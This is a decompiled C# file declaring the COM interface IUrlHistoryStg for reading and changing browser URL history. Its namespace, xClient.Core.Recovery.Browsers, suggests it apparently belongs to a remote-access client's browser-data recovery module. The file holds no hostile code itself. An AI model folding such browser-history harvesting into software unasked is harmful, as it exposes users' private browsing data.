using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000CE RID: 206
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
	[ComImport]
	public interface IUrlHistoryStg
	{
		// Token: 0x06000529 RID: 1321
		void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);

		// Token: 0x0600052A RID: 1322
		void DeleteUrl(string pocsUrl, int dwFlags);

		// Token: 0x0600052B RID: 1323
		void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

		// Token: 0x0600052C RID: 1324
		void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x0600052D RID: 1325
		object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; }
	}
}
